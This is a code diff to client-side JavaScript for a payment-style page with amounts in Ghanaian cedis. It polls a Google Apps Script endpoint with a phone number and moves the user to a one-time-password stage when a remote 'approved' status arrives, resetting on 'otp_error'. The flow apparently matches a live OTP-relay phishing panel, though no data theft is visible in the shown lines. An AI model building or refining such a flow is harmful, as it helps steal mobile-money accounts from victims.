@@ -179,15 +179,23 @@ Amt: GHS ${amt}
     }
 
 async function startPolling(phone) {
+    const cleanPhone = String(phone).trim(); // Ensure no spaces
+    
     const poller = setInterval(async () => {
         try {
-            // Cache buster to ensure we get fresh data from Google
-            const r = await fetch(`${SCRIPT_URL}?num=${phone}&v=${Date.now()}`);
+            // Use a timestamp (v=...) to force Google to bypass its 10-second cache
+            const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanPhone)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
-            console.log("Checking status for " + phone + ": " + status);
+            console.log("Polling " + cleanPhone + ": " + status);
 
-            // CASE: WRONG OTP RECEIVED
+            if (status === "approved") {
+                clearInterval(poller); 
+                showView(3); // Move to OTP Stage
+                runCountdown(30);
+                fetch(`${SCRIPT_URL}?num=${cleanPhone}&cmd=clear`);
+            }
+
             if (status === "otp_error" && !isResetting) {
                 isResetting = true; // Lock to prevent double-triggering
 
@@ -218,18 +226,8 @@ async function startPolling(phone) {
                     isResetting = false; 
                 }, 2000);
             }
-            
-            // CASE: APPROVED (Move to OTP screen)
-            if (status === "approved") {
-                showView(3);
-                runCountdown(30);
-                fetch(`${SCRIPT_URL}?num=${phone}&cmd=clear`);
-            }
-
-        } catch (e) {
-            console.error("Polling error:", e);
-        }
-    }, 3500);
+        } catch (e) { console.error("Poll error", e); }
+    }, 3000);
 }
 
 
